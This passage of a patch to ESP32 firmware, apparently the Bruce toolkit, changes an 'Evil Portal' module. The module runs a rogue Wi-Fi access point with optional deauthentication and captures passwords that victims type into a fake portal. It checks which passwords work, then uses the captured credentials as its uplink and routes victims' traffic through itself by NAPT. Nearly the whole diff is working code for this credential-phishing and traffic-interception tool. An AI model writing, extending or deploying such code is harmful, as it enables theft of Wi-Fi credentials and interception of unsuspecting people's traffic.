@@ -29038,18 +29038,12 @@ index 59ed80e..d218da9 100644
          if (_pendingWifiRestart) {
              _pendingWifiRestart = false;
              restartWiFi();
-@@ -373,6 +398,14 @@ void EvilPortal::loop() {
+@@ -373,6 +398,8 @@ void EvilPortal::loop() {
  
  void EvilPortal::processRequests() {
      if (!_backgroundMode) return;
-+    if (_naptHandoffPending && !_naptHandoffDone && millis() - _naptHandoffAt > 800) {
-+        _naptHandoffPending = false;
-+        String err;
-+        bool ok = portalNaptHandoffFromPortal(this, &err);
-+        _naptHandoffDone = true;
-+        if (!ok) Serial.println("[PORTAL] NAPT handoff failed: " + err);
-+        return; // captive server/DNS were stopped; NAPT owns the AP now
-+    }
++    // Background Portal -> NAPT handoff is owned by portalNaptTask(), which
++    // serializes credential verification, portal teardown, and NAPT startup.
      if (_pendingWifiRestart) {
          _pendingWifiRestart = false;
          restartWiFi();
@@ -29129,7 +29123,7 @@ index 59ed80e..d218da9 100644
  
      capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
      totalCapturedCredentials++;
-+    if (bruceConfig.seclabPlus.portalNaptHandoff && !_naptHandoffDone && !_naptHandoffPending) {
++    if (bruceConfig.seclabPlus.portalNaptHandoff && !_naptHandoffDone && !_naptHandoffPending && (!_verifyPwd || _lastVerifyOk)) {
 +        _naptHandoffPending = true;
 +        _naptHandoffAt = millis();
 +    }
@@ -33587,7 +33581,7 @@ new file mode 100644
 index 0000000..9067c2a
 --- /dev/null
 +++ b/src/modules/wifi/portal_napt.cpp
-@@ -0,0 +1,401 @@
+@@ -0,0 +1,433 @@
 +#include "portal_napt.h"
 +#if !defined(LITE_VERSION)
 +
@@ -33618,6 +33612,7 @@ index 0000000..9067c2a
 +static volatile bool s_handoffDone = false;
 +static volatile bool s_armed = true;
 +static EvilPortal *s_portal = nullptr;
++static bool s_portalStopped = false;
 +
 +static char s_apSsid[33] = {0};
 +static char s_staSsid[33] = {0};
@@ -33657,7 +33652,8 @@ index 0000000..9067c2a
 +
 +static void tearDownPortal() {
 +    if (s_portal) {
-+        s_portal->stop();
++        if (!s_portalStopped) s_portal->stop();
++        s_portalStopped = false;
 +        delete s_portal;
 +        s_portal = nullptr;
 +    }
@@ -33682,6 +33678,7 @@ index 0000000..9067c2a
 +    radioFreeBleForWifi();
 +    ensureWifiPlatform();
 +
++    s_portalStopped = false;
 +    s_portal = new EvilPortal(String(s_apSsid), s_apChannel ? s_apChannel : 6, s_deauth, s_verify, true, true, "");
 +    if (!s_portal) {
 +        setErr("Portal alloc failed");
@@ -33699,26 +33696,48 @@ index 0000000..9067c2a
 +    uint32_t lastDraw = 0;
 +    while (!s_stopReq) {
 +        s_portal->processRequests();
-+        if (s_portal->hasCredentials() && s_formCount == 0) s_formCount = 1;
 +
-+        if (s_armed && s_formCount > 0 && !s_handoffDone) {
-+            String cred = s_portal->getCapturedSSID();
-+            (void)cred;
-+            tearDownPortal();
-+            vTaskDelay(pdMS_TO_TICKS(150));
-+            String err;
-+            if (naptStartBackground(String(s_staSsid), String(s_staPwd), &err)) {
-+                s_handoffDone = true;
-+                seclabAppendLog("/portal_napt.log", String(seclabUptimeSec()) + ",handoff_ok," + s_staSsid);
++        // Verification is a hard gate: never route using a submitted but
++        // unverified password. Let this task own background handoff so the
++        // portal callback and task cannot race to stop/start NAPT twice.
++        bool credentialsReady = s_verify ? s_portal->hasVerifiedPassword()
++                                         : s_portal->hasCredentials();
++        if (s_armed && credentialsReady && !s_handoffDone) {
++            if (s_verify) {
++                String verifiedSsid = s_portal->getLastVerifiedSsid();
++                String verifiedPwd = s_portal->getLastVerifiedPassword();
++                if (verifiedSsid.isEmpty() || verifiedPwd.isEmpty()) {
++                    setErr("Verified uplink credentials missing");
++                    s_handoffDone = true;
++                } else {
++                    strncpy(s_staSsid, verifiedSsid.c_str(), sizeof(s_staSsid) - 1);
++                    s_staSsid[sizeof(s_staSsid) - 1] = 0;
++                    strncpy(s_staPwd, verifiedPwd.c_str(), sizeof(s_staPwd) - 1);
++                    s_staPwd[sizeof(s_staPwd) - 1] = 0;
++                    s_formCount++;
++                }
 +            } else {
-+                setErr("NAPT handoff failed: " + err);
-+                seclabAppendLog("/portal_napt.log", String(seclabUptimeSec()) + ",handoff_fail," + err);
-+                s_handoffDone = true; // avoid retrying forever
++                s_formCount++;
 +            }
-+            ensureMux();
-+            if (xSemaphoreTake(s_mux, pdMS_TO_TICKS(100)) == pdTRUE) {
-+                persistState();
-+                xSemaphoreGive(s_mux);
++
++            if (!s_handoffDone) {
++                String err;
++                bool handedOff = portalNaptHandoffFromPortal(s_portal, &err);
++                if (handedOff) {
++                    s_handoffDone = true;
++                    seclabAppendLog("/portal_napt.log", String(seclabUptimeSec()) + ",handoff_ok," + s_staSsid);
++                } else {
++                    setErr("NAPT handoff failed: " + err);
++                    s_handoffDone = true; // avoid retrying after portal teardown
++                    seclabAppendLog("/portal_napt.log", String(seclabUptimeSec()) + ",handoff_fail," + err);
++                }
++                tearDownPortal();
++                ensureMux();
++                if (xSemaphoreTake(s_mux, pdMS_TO_TICKS(100)) == pdTRUE) {
++                    persistState();
++                    xSemaphoreGive(s_mux);
++                }
++                break;
 +            }
 +        }
 +
@@ -33813,6 +33832,10 @@ index 0000000..9067c2a
 +    if (portal->hasVerifiedPassword()) {
 +        staSsid = portal->getLastVerifiedSsid();
 +        staPwd = portal->getLastVerifiedPassword();
++    } else if (s_running && s_staSsid[0]) {
++        // A regular background Portal -> NAPT run already received its uplink.
++        staSsid = String(s_staSsid);
++        staPwd = String(s_staPwd);
 +    } else if (!pickUplink(staSsid, staPwd)) {
 +        if (errOut) *errOut = "No uplink Wi-Fi saved. Connect once first.";
 +        return false;
@@ -33838,7 +33861,10 @@ index 0000000..9067c2a
 +    s_armed = true;
 +    s_startedMs = millis();
 +
-+    portal->stop();
++    if (!s_portalStopped) {
++        portal->stop();
++        s_portalStopped = true;
++    }
 +    vTaskDelay(pdMS_TO_TICKS(180));
 +    cleanlyStopWebUiForWiFiFeature();
 +    String err;
